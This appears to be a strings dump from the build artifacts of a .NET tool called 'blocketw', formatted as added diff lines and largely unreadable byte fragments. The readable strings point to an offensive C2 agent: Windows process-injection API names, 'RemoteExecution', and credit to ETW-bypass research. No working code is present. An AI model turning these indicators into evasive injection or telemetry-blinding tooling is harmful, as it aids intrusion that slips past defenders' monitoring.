+PROCESS_INFORMATION
+PROTECT_FROM_CLOSE
+PT@PE
+PTHp
+PTHx
+PXD$
+PdRXDA
+PebBaseAddress
+PeekNamedPipe
+PhPa
+PhpD$
+PraTr
+PreviousSuspendCount
+ProcessAccessFlags
+Program Files (x86)
+Properties
+PtED$
+P{ 7
+Q7mgMI{UfuKr:
+QTQ5r
+QbmR
+QueryFullProcessImageName
+QueryInformation
+QueryLimitedInformation
+RDd]p
+RGyM
+RSDSiv
+Re75VbS
+ReadProcessMemory
+Reference Assemblies
+Release
+Release Build is built with .net 4.5 (but can be built for 3.5)
+RemoteExecution
+Repos
+ReturnLength
+RjHsvU}
+RjXA
+RootDirectory
+Rp17O(
+RtlCreateProcessParametersEx
+RtlInitUnicodeString
+RtlUnicodeStringToAnsiString
+RtlZeroMemory
+RuntimeCompatibilityAttribute
+RuntimeData
+S0/1
+S6u[bFJ
+S>2$8
+SAsAEG{n
+SECURITY_ATTRIBUTES
+SM%93:x
+STARTUPINFO
+STARTUPINFOEX
+SectionHandle
+SectionOffset
+SecurityQualityOfService
+SetHandleInformation
+SetInformation
+SetQuota
+ShellInfo
+SizeOfStackCommit
+SizeOfStackReserve
+SolutionGuid = {8CB560AB-5DA9-459C-9A68-1CFFB9E47644}
+Source
+SourceString
+StackZeroBits
+StfX
+StringBuilder
+Strings
+Synchronize
+System
+System.Collections.Generic.KeyValuePair
+System.Collections.Generic.List
+System.Collections.Hashtable
+System.Configuration
+System.Core
+System.Core.dll
+System.Data
+System.Data.DataSetExtensions.dll
+System.Data.SqlXml
+System.Data.dll
+System.Diagnostics
+System.Dynamic
+System.EnterpriseServices
+System.Net.Http.dll
+System.Numerics
+System.OrdinalComparer
+System.Reflection
+System.Runtime.CompilerServices
+System.Runtime.InteropServices
+System.Runtime.Serialization
+System.Runtime.Versioning
+System.Security
+System.Text
+System.Transactions
+System.Version
+System.Xml
+System.Xml.Linq.dll
+System.Xml.dll
+System.dll
+T$0HD$(
+T'7ya
+T6H@F@
+TEL 
+THREAD_BASIC_INFORMATION
+TRACE</DefineConstants>
+TargetFrameworkAttribute
+TebBaseAddress
+Temp
+Terminate
+ThUgg
+There is no output currently for the command. 
+ThreadHandle
+ThreadInformation
+ThreadInformationClass
+ThreadInformationLength
+U4x{d))L_
+U7!vC@
+U8Xgs
+U8dd22
+U9r{f
+U9w2
+UAgent.PInvoke
+UHEAH
+UHEH
+UHH HM
+UIntPtr
+ULEHMMA@
+UNICODE_STRING
+UO@c
+UQBO
+USDE
+USystem
+USystem.Diagnostics
+UT$$UT$ UT$
+UVS@
+UVS]
+UWW7DQX
+UniqueProcess
+UniqueThread
+UpLFc6u
+UpdateProcThreadAttribute
+Users
+V-}i
+V7I]
+VG39S
+ValueType
+Values
+Vc>o
+VcKw
+Version
+Vi.0
+ViewSize
+VirtualAllocEx
+VirtualMemoryOperation
+VirtualMemoryRead
+VirtualMemoryWrite
+VirtualProtectEx
+VisualStudioVersion = 16.0.30011.22
+VxOAj-
+W!(s
+WFRW
+WLbj
+WWD[
+WaitForSingleObject
+WbHp0g
+WeE-
+Wil.Jy
+Win32
+Win32Protect
+WindowTitle
+WnezN}p
+WrapNonExceptionThrows
+WriteProcessMemory
+Wtg6)G
+X6>U@Vm
+XDsN'
+XZ}3
+XjLXR=G
+Y6vC]
+YKeA
+YObSQs
+YS95
+Yc'.
+Z1G'
+Z4@VS$
+ZQRUVS
+ZQdX[
+ZVgX
+ZYFt
+Zg_L4
+[)axPI
+[GEO0l
+[HEH@XH
+[Q!=/e
+[]'ree
+[]U(E
+[]UHH HM
+[]US(E
+[]US4E
+[assembly: ComVisible(false)]
+[i4]p
+]-Tuyk
+]8GEofm
+]GzmShhC
+]U(E
+]U8E
+]UH0
+]UHH
+]UHH HM
+]UHH0HM
+]UHH@HM
+]UHHM
+]UHHPHM
+]UHM
+]UHp
+]USH8H$
+]USHh
+]UVSHHM HU(DE0H] Hu(8HHX
+]UWVS
+]UXE
+]lz>DB7 
+]z)E)O
+_Build
+_CHo
+_CorExeMain
+_Entry_Point
+_JG_zm@lXK%
+_Major
+_Minor
+_N>6http=
+_O-$R
+_Revision
+_Tp1=
+_]U(E
+_]UVSP
+_g6@YI1
+_ignoreCase
+_items
+_size
+_version
+_w4/u
+a>sWw<qg3
+aBI-VkA
+aH)H
+aZ)Fm5
+aae4c9f81314836088327f55a1518e38da65236e
+address
+allocationAttribs
+allowedAssemblyExtensions
+amEUz
+an$!
+and thier research on ETW bypassing.
+appConfigFile
+appdata
+args
+asStr
+assemblyinfo.cs
+auTN
+b'h3
+b34d
+b39J
+bInheritHandle
+bInheritHandles
+bY={)'
+b]0:Wgj./
+b]ZG
+blocketw
+blocketw.csproj.CoreCompileInputs.cache
+blocketw.csprojAssemblyReference.cache
+blocketw.exe
+blocketw.exe.config
+blocketw.pdb
+bqd:
+buffer
+bytesAvail
+bytesRead
+bytesWritten
+bz]e
+cPzBy.l 3J
+cUmBR
+c_I[
+ca3T{$H
+candidateAssemblyFiles
+cbReserved2
+cbSize
+codebase
+cpuarch
+cpz7
+cq)Z=
+d1uWJyD
+d27Cq:uwh
+d2e766d0d31a60a2b8795266bd5415e2f714c314
+d:.W
+dDHyImU
+d_9Sx
+deps
+derek.admin.stanncenter
+desiredAccess
+dwAttributeCount
+dwCreationFlags
+dwDesiredAccess
+dwFillAttribute
+dwFlags
+dwMask
+dwOptions
+dwProcessId
+dwThreadId
+dwXCountChars
+dwXSize
+dwYCountChars
+dwYSize
+e ktoEHy
+eXZX
+e[%q%]V$
+ee7f
+f }!]k
+f@pp
+fCSMT
+fileState
+flAllocationType
+flNewProtect
+flProtect
+flags
+fmdy
+fullFrameworkAssemblyTables
+fullFrameworkFolders
+fullTargetFrameworkSubsetNames$ignoreDefaultInstalledAssemblyTables
+g!(O
+g%_w
+g-rL/
+gdtarSearchPaths
+get_Handle
+gg@jOo8Z(qhJ
+gi(orj D/-
+gxhw
+h VKa/
+hFile
+hModule
+hObject
+hProcess
+hReadPipe
+hS19
+hSourceHandle
+hSourceProcessHandle
+hStdError
+hStdInput
+hStdOutput
+hTargetProcessHandle
+hThread
+hW=N{BQ
+hWritePipe
+hZv1
+h]Lt0
+handle
+hasAN
+hasCI
+hasCpuArch
+hashAlg
+hh@0
+hook
+https://blog.xpnsec.com/hiding-your-dotnet-etw/
+https://rastamouse.me/2020/05/sharpc2/
+hu!e8
+i'yX
+ignoreDefaultInstalledAssemblySubsetTables
+immutable
+inBc
+installedAssemblySubsetTables latestTargetFrameworkDirectories
+installedAssemblyTables
+isSName
+j/GR
+j1Xt
+j76A
+j:qvzu
+jhyGH
+k IBSa
+k)aL
+k-2B
+k4s_
+kcf7(20 
+kernel32
+kernel32.dll
+keypair
+l!5NN
+l7NR
+l9Yp
+l@>oY
+lLL[
+length
+local
+lpAddress
+lpApplicationName
+lpAttributeList
+lpBaseAddress
+lpBuffer
+lpBytesBuffer
+lpCommandLine
+lpCurrentDirectory
+lpDesktop
+lpEnvironment
+lpExeName
+lpNumberOfBytesRead
+lpNumberOfBytesWritten
+lpParameter
+lpPipeAttributes
+lpPreviousValue
+lpProcessAttributes
+lpProcessInformation
+lpReserved
+lpReserved2
+lpReturnSize
+lpSecurityDescriptor
+lpSize
+lpStartAddress
+lpStartupInfo
+lpTargetHandle
+lpThreadAttributes
+lpTitle
+lpValue
+lpdwSize
+lpflOldProtect
+m06Z]
+m4IjWy
+m7gZe/]Gg
+m8Mf
+m=P)<
+milliseconds
+mk}m2
+modk
+mscoree.dll
+mscorlib
+mscorlib.dll
+msil
+mw/Q
+mxFF
+mxfr<}Pp
+n'>nK
+n5G!
+nBufferSize
+nVQ(W1Cq
+name
+namespace Agent.Execution
+namespace Agent.PInvoke
+normidna.nlp
+normnfc.nlp
+normnfd.nlp
+normnfkc.nlp
+normnfkd.nlp
+ntdll.dll
+nu!7j
+o5Gus
+o:MBu
+oKtq-4-)W
+oN@NykGmR
+oco=XQJ
+oj-I
+oldProtect
+op_Explicit
+orMM
+orMox
+otI4
+p4e-l
+pAttrs
+pHEH@8H
+pProcessParameters
+pQdW
+pageProt
+pdtarSearchPaths
+pn3-(lrKCZE8aI
+pn@U
+procName
+processAccess
+processHandle
+processId
+processInformation
+processInformationClass
+processInformationLength
+profileName
+properties
+q-/U2elOSGF(
+q2]h5n
+q@PBv
+qHi.e/c
+qMGP7
+r-]p
+rK=}8
+r]NT:I
+referencePaths
+registrySearchPath
+remapped
+remoteexec.cs
+repos
+returnLength
+rlMmK
+rtver
+s$<Kl
+s(!7U-)
+section
+sfiles
+snKw
+source
+stateFile
+swyZ[W
+t 44
+t$HEHUMHH
+t%HE
+t%HEH@XH
+t/$E
+t3wEtM
+t3z1JHS
+t6H}(
+t9H}0
+t<EHH
+t>EE
+t@cnp<
+tEE%
+tEUWVS
+tEtEE
+tFFkOw
+tHEHP]UH
+tJHE
+t]HEPH
+targetFrameworkDirectories
+targetFrameworkMoniker!targetFrameworkMonikerDisplayName
+targetFrameworkSubsets
+targetFrameworkVersion
+targetProcessorArchitecture
+targetedRuntimeVersion
+tbdyis>O
+temp
+txqY
+u $M
+u HE
+u-ED$
+u1H0
+u5i43@O}
+u@EEE
+uE@TD$
+uSpD$
+uViF
+useReferencesFromProject
+users
+using Agent.PInvoke
+using System
+using System.Diagnostics
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Text
+v1w:A
+v4.0.30319
+v4.5
+v6N@KLyp
+v:EUD$
+vEUUXE
+vH ]UHHPHM
+vH)H
+vHEH0]UHHPHM
+vHEHHM
+va)L'
+value__
+venW
+verCompat
+viW_(<6n
+wShowWindow
+wVhU
+wY/y
+we@Y{
+win32.cs
+wq%N
+x$Xi
+x4>(X
+xNFc
+xWwq
+xfyaF{
+xh8p
+xlnw6Kd
+xxVx
+y/C[U
+yF2BQi-x
+yQr{z4E7
+{($C
+{2o}h
+{3:=
+{CandidateAssemblyFiles}
+{DAEDF7B3-8262-4892-ADC4-425DD5F85BCA}.Debug
+{DAEDF7B3-8262-4892-ADC4-425DD5F85BCA}.Release
+{HintPathFromItem}
+{RawFileName}
+{TX7>-
+{TargetFrameworkDirectory}
+{_ry
+{vBo)]1YzR
+{{cS
+}4yN
+}@us
+}[J=Wk
